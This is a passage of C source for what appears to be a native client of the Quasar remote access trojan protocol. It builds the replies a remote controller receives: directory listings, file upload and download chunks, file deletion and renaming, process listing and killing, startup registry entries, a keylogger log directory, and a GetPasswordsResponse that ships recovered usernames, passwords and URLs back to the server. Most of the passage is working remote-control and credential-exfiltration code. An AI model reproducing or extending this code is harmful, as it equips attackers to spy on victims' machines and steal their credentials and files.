    out[pos++] = (unsigned char)TAG(3, WIRE_VARINT);
    pos += put_varint((unsigned int)monitor, out + pos);
    unsigned char res_buf[24];
    unsigned int res_len = put_resolution(res_buf, sizeof(res_buf), width, height);
    if (pos + 2 + res_len > out_size) return 0;
    out[pos++] = (unsigned char)TAG(4, WIRE_LEN);
    pos += put_varint(res_len, out + pos);
    memcpy(out + pos, res_buf, res_len);
    return pos + res_len;
}

/* Skip one protobuf field (tag + value). Sets *out_consumed to bytes consumed; returns 1 on success, 0 on error. */
static int skip_field(const unsigned char* buf, unsigned int buf_len, unsigned int* out_consumed) {
    if (buf_len < 1 || !out_consumed) { *out_consumed = 0; return 0; }
    unsigned int wire = buf[0] & 7;
    if (wire == 0) {
        unsigned int n = 0;
        read_varint(buf + 1, buf_len - 1, &n);
        if (n == 0) return 0;
        *out_consumed = 1 + n;
        return 1;
    }
    if (wire == 2) {
        unsigned int n = 0;
        unsigned int len = read_varint(buf + 1, buf_len - 1, &n);
        if (n == 0 || 1u + n + len > buf_len) return 0;
        *out_consumed = 1 + n + len;
        return 1;
    }
    return 0;
}

/* Parse GetDirectory body: field 1 RemotePath (tag 0x0A, length-delimited string).
 * If body starts with 0x12 (field 2 length-delimited), unwrap once; inner may be 0x0A+path or raw path bytes. */
int remote_proto_decode_get_directory(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size) {
    if (!body || !path_buf || path_buf_size == 0) return 0;
    path_buf[0] = '\0';
    /* Unwrap field 2 (0x12) envelope if present (protobuf-net polymorphic format). */
    if (body_len >= 3 && body[0] == 0x12) {
        unsigned int len_consumed = 0;
        unsigned int inner_len = read_varint(body + 1, body_len - 1, &len_consumed);
        if (len_consumed > 0 && 1u + len_consumed + inner_len <= body_len) {
            body = body + 1 + len_consumed;
            body_len = inner_len;
        }
    }
    /* Some servers send raw path bytes (no 0x0A tag) inside the 0x12 envelope, e.g. "C:\Users". */
    if (body_len > 0 && body_len < path_buf_size && body[0] != 0x0A && body[0] != 0x12) {
        unsigned int copy_len = body_len;
        if (copy_len >= path_buf_size) copy_len = path_buf_size - 1;
        memcpy(path_buf, body, copy_len);
        path_buf[copy_len] = '\0';
        return 1;
    }
    unsigned int i = 0;
    while (i + 1 < body_len) {
        unsigned char tag = body[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (field == 1 && wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int len = read_varint(body + i, body_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + len > body_len || len >= path_buf_size) return 0;
            i += len_consumed;
            memcpy(path_buf, body + i, len);
            path_buf[len] = '\0';
            return 1;
        }
        /* Skip this field so we don't mis-parse (e.g. field 1 varint before field 1 string). */
        unsigned int skip = 0;
        if (!skip_field(body + i - 1, body_len - (i - 1), &skip)) return 0;
        i += skip - 1; /* advance past value (we already advanced i past the tag) */
    }
    return 0;
}

/* FileSystemEntry: field 1 EntryType (varint), 2 Name (string), 3 Size (varint). Omit LastAccessTimeUtc (field 4) to avoid DateTime wire-type mismatch with protobuf-net. */
static unsigned int put_file_system_entry(unsigned char* out, unsigned int out_size, int is_dir, const char* name, unsigned long long size) {
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint(is_dir ? 1 : 0, out + pos);
    pos += put_string(out + pos, out_size - pos, 2, name);
    out[pos++] = (unsigned char)TAG(3, WIRE_VARINT);
    pos += put_varint((unsigned int)(size > 0xFFFFFFFFULL ? 0xFFFFFFFF : (unsigned int)size), out + pos);
    return pos;
}

/* Strip leading UTF-8 BOM, control chars, and any leading garbage so path starts with a valid path char (letter, \\, .). */
static void sanitize_path(char* path, unsigned int path_size) {
    if (!path || path_size == 0) return;
    /* Strip UTF-8 BOM (EF BB BF). */
    if (path_size >= 3 && (unsigned char)path[0] == 0xEF && (unsigned char)path[1] == 0xBB && (unsigned char)path[2] == 0xBF) {
        memmove(path, path + 3, path_size - 3);
        path[path_size - 3] = '\0';
    }
    /* Strip leading control chars, space, and non-path bytes until we see A-Z, a-z, \\, /, or digit (valid path start). */
    while (path[0] != '\0') {
        unsigned char c = (unsigned char)path[0];
        if (c <= 32) {
            memmove(path, path + 1, path_size - 1);
            path[path_size - 1] = '\0';
            continue;
        }
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == '\\' || c == '/' || (c >= '0' && c <= '9'))
            break;
        memmove(path, path + 1, path_size - 1);
        path[path_size - 1] = '\0';
    }
    /* Strip trailing control chars and space. */
    for (size_t i = strlen(path); i > 0; i--) {
        if ((unsigned char)path[i - 1] <= 32 || path[i - 1] == ' ') {
            path[i - 1] = '\0';
        } else {
            break;
        }
    }
}

/* Public: normalize path for file/dir operations (strip garbage, / -> \). */
void remote_proto_normalize_path(char* path, unsigned int path_size) {
    if (!path || path_size == 0) return;
    sanitize_path(path, path_size);
    for (unsigned int i = 0; path[i] && i < path_size; i++) {
        if (path[i] == '/') path[i] = '\\';
    }
}

/* Normalize path for FindFirstFileA: replace / with \\, ensure drive root "X:" becomes "X:\". */
static void normalize_path_for_find(char* path, unsigned int path_size) {
    if (!path || path_size == 0) return;
    sanitize_path(path, path_size);
    for (unsigned int i = 0; path[i] && i < path_size; i++) {
        if (path[i] == '/') path[i] = '\\';
    }
    /* Ensure "X:" has trailing backslash so "X:\*" is valid. */
    size_t len = strlen(path);
    if (len == 2 && path[1] == ':' && path[0] != '\0' && (path[0] >= 'A' && path[0] <= 'Z' || path[0] >= 'a' && path[0] <= 'z')) {
        if (len + 2 <= path_size) {
            path[2] = '\\';
            path[3] = '\0';
        }
    }
}

/* GetDirectoryResponse: field 1 RemotePath (string), field 2 Items (repeated FileSystemEntry). Uses FindFirstFileA. */
unsigned int remote_proto_encode_get_directory_response(const char* remote_path, unsigned char* out, unsigned int out_size) {
    if (!out || !remote_path || out_size < 64) return 0;
    unsigned int pos = 0;
    char norm_path[MAX_PATH];
    strncpy_s(norm_path, sizeof(norm_path), remote_path, _TRUNCATE);
    normalize_path_for_find(norm_path, (unsigned int)sizeof(norm_path));
    /* Emit normalized path in RemotePath so the server UI doesn't see illegal characters. */
    pos += put_string(out + pos, out_size - pos, 1, norm_path);
    char search_path[MAX_PATH];
    {
        _snprintf_s(search_path, sizeof(search_path), _TRUNCATE, "%s*", norm_path);
        /* Ensure we have "dir\*" not "dir*" when dir doesn't end with backslash. */
        if (norm_path[0]) {
            size_t n = strlen(norm_path);
            if (n > 0 && norm_path[n - 1] != '\\' && n + 2 < sizeof(search_path)) {
                search_path[0] = '\0';
                _snprintf_s(search_path, sizeof(search_path), _TRUNCATE, "%s\\*", norm_path);
            }
        }
    }
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search_path, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        remote_log("[proto] GetDirectory FindFirstFileA failed: path=%s, err=%lu", search_path, (unsigned long)GetLastError());
        return pos;
    }
    do {
        if (fd.cFileName[0] == '.' && (fd.cFileName[1] == '\0' || (fd.cFileName[1] == '.' && fd.cFileName[2] == '\0')))
            continue;
        if (fd.cFileName[0] == '\0') continue; /* skip empty names */
        unsigned char entry_buf[512];
        int is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
        unsigned long long sz = is_dir ? 0 : ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        unsigned int entry_len = put_file_system_entry(entry_buf, sizeof(entry_buf), is_dir, fd.cFileName, sz);
        if (entry_len == 0) continue; /* e.g. empty name skipped by put_string */
        if (pos + 2 + entry_len > out_size) break;
        out[pos++] = (unsigned char)TAG(2, WIRE_LEN);
        pos += put_varint(entry_len, out + pos);
        memcpy(out + pos, entry_buf, entry_len);
        pos += entry_len;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return pos;
}

/* GetKeyloggerLogsDirectoryResponse: field 1 LogsDirectory (string). */
unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const char* logs_directory, unsigned char* out, unsigned int out_size) {
    if (!out || !logs_directory || out_size < 16) return 0;
    return put_string(out, out_size, 1, logs_directory);
}

/* RecoveredAccount: field 1 Username, 2 Password, 3 Url, 4 Application. */
static unsigned int put_recovered_account(const remote_recovered_account_t* a, unsigned char* out, unsigned int out_size) {
    unsigned int pos = 0;
    unsigned int n;
    if (a->username[0]) { n = put_string(out + pos, out_size - pos, 1, a->username); if (n) pos += n; }
    if (a->password[0]) { n = put_string(out + pos, out_size - pos, 2, a->password); if (n) pos += n; }
    if (a->url[0]) { n = put_string(out + pos, out_size - pos, 3, a->url); if (n) pos += n; }
    if (a->application[0]) { n = put_string(out + pos, out_size - pos, 4, a->application); if (n) pos += n; }
    return pos;
}

/* GetPasswordsResponse: field 1 repeated RecoveredAccount. */
unsigned int remote_proto_encode_get_passwords_response(const void* accounts, unsigned int count, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 16) return 0;
    const remote_recovered_account_t* arr = (const remote_recovered_account_t*)accounts;
    unsigned int pos = 0;
    for (unsigned int i = 0; i < count && pos + 64 < out_size; i++) {
        unsigned char entry_buf[4096];
        unsigned int entry_len = put_recovered_account(&arr[i], entry_buf, sizeof(entry_buf));
        if (entry_len == 0) continue;
        if (pos + 2 + entry_len > out_size) break;
        out[pos++] = (unsigned char)TAG(1, WIRE_LEN);
        pos += put_varint(entry_len, out + pos);
        if (pos + entry_len > out_size) break;
        memcpy(out + pos, entry_buf, entry_len);
        pos += entry_len;
    }
    return pos;
}

/* Unwrap optional length-delimited outer envelope (protobuf-net polymorphic). */
static void unwrap_body_once(const unsigned char* body, unsigned int body_len, const unsigned char** out_parse, unsigned int* out_parse_len) {
    *out_parse = body;
    *out_parse_len = body_len;
    if (body_len >= 3) {
        unsigned int tag_consumed = 0;
        unsigned int tag_val = read_varint(body, body_len, &tag_consumed);
        if (tag_consumed > 0 && (tag_val & 7) == 2) {
            unsigned int len_consumed = 0;
            unsigned int inner_len = read_varint(body + tag_consumed, body_len - tag_consumed, &len_consumed);
            if (len_consumed > 0 && inner_len > 0 && tag_consumed + len_consumed + inner_len <= body_len) {
                *out_parse = body + tag_consumed + len_consumed;
                *out_parse_len = inner_len;
            }
        }
    }
}

/* Parse DoPathDelete body: field 1 Path (string), field 2 PathType (varint). FileType: 0=File, 1=Directory. */
int remote_proto_decode_do_path_delete(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size, int* out_path_type) {
    if (!body || !path_buf || path_buf_size == 0 || !out_path_type) return 0;
    path_buf[0] = '\0';
    *out_path_type = 0;
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    unwrap_body_once(body, body_len, &parse, &parse_len);
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int field = tag >> 3;
        unsigned int wire = tag & 7;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 2) *out_path_type = (int)(v == 1 ? 1 : 0); /* 1=Directory, else File */
            i += consumed;
            continue;
        }
        if (wire != 2) break;
        unsigned int len_consumed = 0;
        unsigned int len = read_varint(parse + i, parse_len - i, &len_consumed);
        if (len_consumed == 0 || i + len_consumed + len > parse_len || len >= path_buf_size) break;
        i += len_consumed;
        if (field == 1) {
            memcpy(path_buf, parse + i, len);
            path_buf[len] = '\0';
        }
        i += len;
    }
    return (path_buf[0] != '\0') ? 1 : 0;
}

/* Parse DoPathRename body: field 1 Path, 2 NewPath, 3 PathType (varint). */
int remote_proto_decode_do_path_rename(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size, char* new_path_buf, unsigned int new_path_buf_size, int* out_path_type) {
    if (!body || !path_buf || !new_path_buf || !out_path_type) return 0;
    path_buf[0] = '\0';
    new_path_buf[0] = '\0';
    *out_path_type = 0;
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    unwrap_body_once(body, body_len, &parse, &parse_len);
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int field = tag >> 3;
        unsigned int wire = tag & 7;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 3) *out_path_type = (int)(v == 1 ? 1 : 0);
            i += consumed;
            continue;
        }
        if (wire != 2) break;
        unsigned int len_consumed = 0;
        unsigned int len = read_varint(parse + i, parse_len - i, &len_consumed);
        if (len_consumed == 0 || i + len_consumed + len > parse_len) break;
        i += len_consumed;
        if (field == 1 && len < path_buf_size) {
            memcpy(path_buf, parse + i, len);
            path_buf[len] = '\0';
        } else if (field == 2 && len < new_path_buf_size) {
            memcpy(new_path_buf, parse + i, len);
            new_path_buf[len] = '\0';
        }
        i += len;
    }
    return (path_buf[0] != '\0' && new_path_buf[0] != '\0') ? 1 : 0;
}

/* Parse FileTransferCancel body: field 1 Id (varint), field 2 Reason (string, optional). */
int remote_proto_decode_file_transfer_cancel(const unsigned char* body, unsigned int body_len, int* out_id, char* reason_buf, unsigned int reason_buf_size) {
    if (!body || !out_id) return 0;
    *out_id = 0;
    if (reason_buf && reason_buf_size) reason_buf[0] = '\0';
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    unwrap_body_once(body, body_len, &parse, &parse_len);
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int field = tag >> 3;
        unsigned int wire = tag & 7;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) *out_id = (int)v;
            i += consumed;
            continue;
        }
        if (wire != 2) break;
        unsigned int len_consumed = 0;
        unsigned int len = read_varint(parse + i, parse_len - i, &len_consumed);
        if (len_consumed == 0 || i + len_consumed + len > parse_len) break;
        i += len_consumed;
        if (field == 2 && reason_buf && reason_buf_size && len < reason_buf_size) {
            memcpy(reason_buf, parse + i, len);
            reason_buf[len] = '\0';
        }
        i += len;
    }
    return 1; /* Id can be 0; caller uses *out_id */
}

/* Encode SetStatusFileManager: field 1 Message (string), field 2 SetLastDirectorySeen (varint bool). */
unsigned int remote_proto_encode_set_status_file_manager(const char* message, int set_last_directory_seen, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 8) return 0;
    unsigned int pos = 0;
    if (message && message[0]) {
        unsigned int n = put_string(out + pos, out_size - pos, 1, message);
        if (n == 0) return 0;
        pos += n;
    }
    out[pos++] = (unsigned char)TAG(2, WIRE_VARINT);
    pos += put_varint(set_last_directory_seen ? 1u : 0u, out + pos);
    return pos;
}

/* Encode FileTransferCancel (client sends to server): field 1 Id, field 2 Reason. */
unsigned int remote_proto_encode_file_transfer_cancel(int id, const char* reason, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 8) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint((unsigned int)id, out + pos);
    if (reason && reason[0]) {
        unsigned int n = put_string(out + pos, out_size - pos, 2, reason);
        if (n) pos += n;
    }
    return pos;
}

/* Parse FileTransferChunk body when receiving from server. Unwrap field-32 or field-34 if present, then parse Id, FilePath, FileSize, Chunk. */
int remote_proto_decode_file_transfer_chunk(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size, long long* out_file_size, long long* out_offset, unsigned char* data_buf, unsigned int data_buf_size, unsigned int* out_data_len) {
    if (!body || !out_id || !path_buf || !out_file_size || !out_offset || !data_buf || !out_data_len) return 0;
    *out_id = 0;
    path_buf[0] = '\0';
    *out_file_size = 0;
    *out_offset = 0;
    *out_data_len = 0;
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    if (parse_len >= 3) {
        unsigned int tag_consumed = 0, len_consumed = 0;
        unsigned int tag_val = read_varint(parse, parse_len, &tag_consumed);
        /* Some serializers wrap the FileTransferChunk in a length-delimited envelope (e.g. field 32, 33, 34...). */
        unsigned int env_field = tag_val >> 3;
        unsigned int env_wire = tag_val & 7;
        if (tag_consumed > 0 && tag_consumed < parse_len && env_wire == 2 && env_field >= 16u) {
            unsigned int inner_len = read_varint(parse + tag_consumed, parse_len - tag_consumed, &len_consumed);
            if (len_consumed > 0 && inner_len > 0 && tag_consumed + len_consumed + inner_len <= parse_len) {
                parse = parse + tag_consumed + len_consumed;
                parse_len = inner_len;
            }
        }
    }
    unsigned int i = 0;
    while (i < parse_len) {
        if (i >= parse_len) break;
        unsigned char tag = parse[i++];
        unsigned int field = tag >> 3;
        unsigned int wire = tag & 7;
        if (wire == 0) {
            unsigned int consumed = 0;
            if (field == 1) {
                unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
                if (consumed == 0) break;
                *out_id = (int)v;
            } else if (field == 3) {
                unsigned long long v64 = read_varint64(parse + i, parse_len - i, &consumed);
                if (consumed == 0) break;
                *out_file_size = (long long)v64;
            } else {
                read_varint(parse + i, parse_len - i, &consumed);
                if (consumed == 0) break;
            }
            i += consumed;
            continue;
        }
        if (wire != 2) break;
        unsigned int len_consumed = 0;
        unsigned int len = read_varint(parse + i, parse_len - i, &len_consumed);
        if (len_consumed == 0 || i + len_consumed + len > parse_len) break;
        i += len_consumed;
        if (field == 2) {
            if (len < path_buf_size) {
                memcpy(path_buf, parse + i, len);
                path_buf[len] = '\0';
            }
            i += len;
            continue;
        }
        if (field == 4) {
            int msg_end = i + len;
            while (i < (unsigned int)msg_end) {
                if (i >= (unsigned int)msg_end) break;
                unsigned char ct = parse[i++];
                unsigned int cf = ct >> 3;
                unsigned int cw = ct & 7;
                if (cw == 0) {
                    unsigned int ccons = 0;
                    unsigned long long v64 = read_varint64(parse + i, (unsigned int)msg_end - i, &ccons);
                    if (ccons == 0) break;
                    if (cf == 1) *out_offset = (long long)v64;
                    i += ccons;
                    continue;
                }
                if (cw != 2) break;
                unsigned int lcons = 0;
                unsigned int dlen = read_varint(parse + i, (unsigned int)msg_end - i, &lcons);
                if (lcons == 0 || i + lcons + dlen > (unsigned int)msg_end || dlen > data_buf_size) break;
                i += lcons;
                memcpy(data_buf, parse + i, dlen);
                *out_data_len = dlen;
                i += dlen;
                break;
            }
            i = (unsigned int)msg_end;
            continue;
        }
        i += len;
    }
    return (*out_data_len > 0) ? 1 : 0;
}

/* Parse FileTransferRequest body: field 1 Id (varint), field 2 RemotePath (string).
 * Server (protobuf-net) may wrap body in length-delimited envelope (field 34, 42, etc); unwrap once. */
int remote_proto_decode_file_transfer_request(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size) {
    if (!body || !out_id || !path_buf || path_buf_size == 0) return 0;
    *out_id = 0;
    path_buf[0] = '\0';
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    if (parse_len >= 3) {
        unsigned int tag_consumed = 0;
        unsigned int tag_val = read_varint(parse, parse_len, &tag_consumed);
        if (tag_consumed > 0 && (tag_val & 7) == 2) {
            unsigned int len_consumed = 0;
            unsigned int inner_len = read_varint(parse + tag_consumed, parse_len - tag_consumed, &len_consumed);
            if (len_consumed > 0 && inner_len > 0 && tag_consumed + len_consumed + inner_len <= parse_len) {
                parse = parse + tag_consumed + len_consumed;
                parse_len = inner_len;
            }
        }
    }
    unsigned int i = 0;
    while (i < parse_len) {
        if (i >= parse_len) break;
        unsigned char tag = parse[i++];
        unsigned int field = tag >> 3;
        unsigned int wire = tag & 7;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) *out_id = (int)v;
            i += consumed;
            continue;
        }
        if (wire != 2) break;
        unsigned int len_consumed = 0;
        unsigned int len = read_varint(parse + i, parse_len - i, &len_consumed);
        if (len_consumed == 0 || i + len_consumed + len > parse_len || len >= path_buf_size) break;
        i += len_consumed;
        if (field == 2) {
            memcpy(path_buf, parse + i, len);
            path_buf[len] = '\0';
        }
        i += len;
    }
    return (path_buf[0] != '\0') ? 1 : 0;
}

/* Encode Chunk nested message: field 1 Offset (varint), field 2 Data (bytes). */
static unsigned int put_chunk_message(unsigned char* out, unsigned int out_size, long long offset, const unsigned char* data, unsigned int data_len) {
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint64((unsigned long long)offset, out + pos);
    pos += put_bytes(out + pos, out_size - pos, 2, data, data_len);
    return pos;
}

unsigned int remote_proto_encode_file_transfer_chunk(int id, const char* file_path, long long file_size, long long offset, const unsigned char* data, unsigned int data_len, unsigned char* out, unsigned int out_size) {
    if (!out || !file_path || out_size < 64) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint((unsigned int)id, out + pos);
    pos += put_string(out + pos, out_size - pos, 2, file_path);
    out[pos++] = (unsigned char)TAG(3, WIRE_VARINT);
    pos += put_varint64((unsigned long long)file_size, out + pos);
    /* Use static buffer for nested Chunk message to avoid large stack allocation. */
    static unsigned char chunk_buf[65535 + 32];
    unsigned int chunk_len = put_chunk_message(chunk_buf, sizeof(chunk_buf), offset, data, data_len);
    if (chunk_len == 0 || pos + 2 + chunk_len > out_size) return 0;
    out[pos++] = (unsigned char)TAG(4, WIRE_LEN);
    pos += put_varint(chunk_len, out + pos);
    memcpy(out + pos, chunk_buf, chunk_len);
    return pos + chunk_len;
}

unsigned int remote_proto_encode_file_transfer_complete(int id, const char* file_path, unsigned char* out, unsigned int out_size) {
    if (!out || !file_path || out_size < 16) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint((unsigned int)id, out + pos);
    pos += put_string(out + pos, out_size - pos, 2, file_path);
    return pos;
}

/* StartupType enum (matches Quasar.Common.Enums.StartupType) */
#define REMOTE_STARTUP_LocalMachineRun      0
#define REMOTE_STARTUP_LocalMachineRunOnce  1
#define REMOTE_STARTUP_CurrentUserRun       2
#define REMOTE_STARTUP_CurrentUserRunOnce   3
#define REMOTE_STARTUP_StartMenu            4
#define REMOTE_STARTUP_LocalMachineRunX86   5
#define REMOTE_STARTUP_LocalMachineRunOnceX86 6

/* Put one StartupItem message. Returns byte count or 0. */
static unsigned int put_startup_item(unsigned char* out, unsigned int out_size, const char* name, const char* path, unsigned int type_val) {
    if (!out || out_size < 8) return 0;
    unsigned char item_buf[1024];
    unsigned int item_pos = 0;
    unsigned int n;
    n = put_string(item_buf + item_pos, sizeof(item_buf) - item_pos, 1, name);
    if (n == 0) return 0;
    item_pos += n;
    n = put_string(item_buf + item_pos, sizeof(item_buf) - item_pos, 2, path);
    if (n == 0) return 0;
    item_pos += n;
    item_buf[item_pos++] = (unsigned char)TAG(3, WIRE_VARINT);
    item_pos += put_varint(type_val, item_buf + item_pos);
    if (item_pos > out_size - 2) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_LEN);
    pos += put_varint(item_pos, out + pos);
    if (pos + item_pos > out_size) return 0;
    memcpy(out + pos, item_buf, item_pos);
    return pos + item_pos;
}

/* Enumerate registry key values, add each as StartupItem. key_path relative to hive. */
static unsigned int add_registry_startup_items(HKEY hive, const char* key_path, unsigned int type_val,
    unsigned char* out, unsigned int out_size, unsigned int* pos) {
    HKEY hKey = NULL;
    if (RegOpenKeyExA(hive, key_path, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return *pos;
    char name_buf[512];
    char value_buf[2048];
    DWORD name_len, value_len;
    DWORD i = 0;
    while (1) {
        name_len = (DWORD)sizeof(name_buf);
        value_len = (DWORD)sizeof(value_buf);
        if (RegEnumValueA(hKey, i, name_buf, &name_len, NULL, NULL, (LPBYTE)value_buf, &value_len) != ERROR_SUCCESS)
            break;
        name_buf[name_len < sizeof(name_buf) ? name_len : sizeof(name_buf) - 1] = '\0';
        value_buf[value_len < sizeof(value_buf) ? value_len : sizeof(value_buf) - 1] = '\0';
        unsigned int n = put_startup_item(out + *pos, out_size - *pos, name_buf, value_buf, type_val);
        if (n == 0) break;
        *pos += n;
        i++;
    }
    RegCloseKey(hKey);
    return *pos;
}

unsigned int remote_proto_encode_get_startup_items_response(unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 64) return 0;
    unsigned int pos = 0;
    add_registry_startup_items(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        REMOTE_STARTUP_LocalMachineRun, out, out_size, &pos);
    add_registry_startup_items(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        REMOTE_STARTUP_LocalMachineRunOnce, out, out_size, &pos);
    add_registry_startup_items(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        REMOTE_STARTUP_CurrentUserRun, out, out_size, &pos);
    add_registry_startup_items(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        REMOTE_STARTUP_CurrentUserRunOnce, out, out_size, &pos);
    add_registry_startup_items(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        REMOTE_STARTUP_LocalMachineRunX86, out, out_size, &pos);
    add_registry_startup_items(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        REMOTE_STARTUP_LocalMachineRunOnceX86, out, out_size, &pos);
    /* Startup folder */
    {
        char startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
            char search_path[MAX_PATH + 4];
            _snprintf_s(search_path, sizeof(search_path), _TRUNCATE, "%s\\*", startup_path);
            WIN32_FIND_DATAA fd;
            HANDLE h = FindFirstFileA(search_path, &fd);
            if (h != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    if (_stricmp(fd.cFileName, "desktop.ini") == 0) continue;
                    char full_path[MAX_PATH];
                    _snprintf_s(full_path, sizeof(full_path), _TRUNCATE, "%s\\%s", startup_path, fd.cFileName);
                    unsigned int n = put_startup_item(out + pos, out_size - pos, fd.cFileName, full_path, REMOTE_STARTUP_StartMenu);
                    if (n == 0) break;
                    pos += n;
                } while (FindNextFileA(h, &fd));
                FindClose(h);
            }
        }
    }
    return pos;
}

/* GetProcessesResponse: field 1 repeated Process. Process: field 1 Name (string), 2 Id (varint), 3 MainWindowTitle (string). */
static unsigned int put_process_item(unsigned char* out, unsigned int out_size, const char* name, int pid, const char* main_window_title) {
    if (!out || out_size < 16) return 0;
    unsigned char item_buf[768];
    unsigned int item_pos = 0;
    unsigned int n;
    n = put_string(item_buf + item_pos, sizeof(item_buf) - item_pos, 1, name);
    if (n == 0) return 0;
    item_pos += n;
    item_buf[item_pos++] = (unsigned char)TAG(2, WIRE_VARINT);
    item_pos += put_varint((unsigned int)(pid < 0 ? 0 : pid), item_buf + item_pos);
    if (main_window_title && main_window_title[0]) {
        n = put_string(item_buf + item_pos, sizeof(item_buf) - item_pos, 3, main_window_title);
        if (n > 0) item_pos += n;
    }
    if (item_pos > out_size - 2) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_LEN);
    pos += put_varint(item_pos, out + pos);
    if (pos + item_pos > out_size) return 0;
    memcpy(out + pos, item_buf, item_pos);
    return pos + item_pos;
}

unsigned int remote_proto_encode_get_processes_response(unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 256) return 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    unsigned int pos = 0;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(hSnap, &pe)) {
        do {
            char name_buf[260];
            char title_buf[256];
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name_buf, (int)sizeof(name_buf), NULL, NULL);
            name_buf[sizeof(name_buf) - 1] = '\0';
            {
                size_t name_len = strlen(name_buf);
                if (name_len >= 4 && _stricmp(name_buf + name_len - 4, ".exe") != 0) {
                    if (name_len + 4 < sizeof(name_buf)) {
                        memcpy(name_buf + name_len, ".exe", 5);
                    }
                }
            }
            title_buf[0] = '\0';
            {
                HWND hwnd = NULL;
                DWORD procId = pe.th32ProcessID;
                WCHAR title_w[256];
                while ((hwnd = FindWindowExW(NULL, hwnd, NULL, NULL)) != NULL) {
                    DWORD wndPid;
                    GetWindowThreadProcessId(hwnd, &wndPid);
                    if (wndPid == procId) {
                        if (GetWindowTextW(hwnd, title_w, 256) > 0)
                            WideCharToMultiByte(CP_UTF8, 0, title_w, -1, title_buf, (int)sizeof(title_buf), NULL, NULL);
                        title_buf[sizeof(title_buf) - 1] = '\0';
                        break;
                    }
                }
            }
            unsigned int n = put_process_item(out + pos, out_size - pos, name_buf, (int)pe.th32ProcessID, title_buf[0] ? title_buf : NULL);
            if (n == 0) break;
            pos += n;
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pos;
}

/* Parse DoProcessEnd: field 1 Pid (varint). */
int remote_proto_decode_do_process_end(const unsigned char* body, unsigned int body_len, int* pid) {
    if (!body || !pid || body_len < 2) return 0;
    *pid = 0;
    unsigned int i = 0;
    while (i + 2 <= body_len) {
        unsigned char tag = body[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(body + i, body_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) { *pid = (int)v; return 1; }
